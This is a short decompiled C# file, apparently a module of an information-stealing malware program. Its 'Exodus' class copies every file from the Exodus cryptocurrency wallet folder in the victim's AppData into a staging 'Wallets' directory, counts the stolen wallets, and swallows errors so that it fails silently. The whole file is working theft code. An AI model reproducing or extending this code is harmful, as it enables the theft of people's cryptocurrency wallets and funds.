﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000034 RID: 52
	internal class Exodus
	{
		// Token: 0x06000101 RID: 257 RVA: 0x000061A4 File Offset: 0x000043A4
		public static void ExodusStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Exodus\\exodus.wallet\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
					fileInfo.CopyTo(directorypath + Exodus.ExodusDir + fileInfo.Name);
				}
				Exodus.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000080 RID: 128
		public static int count = 0;

		// Token: 0x04000081 RID: 129
		public static string ExodusDir = "\\Wallets\\Exodus\\";
	}
}
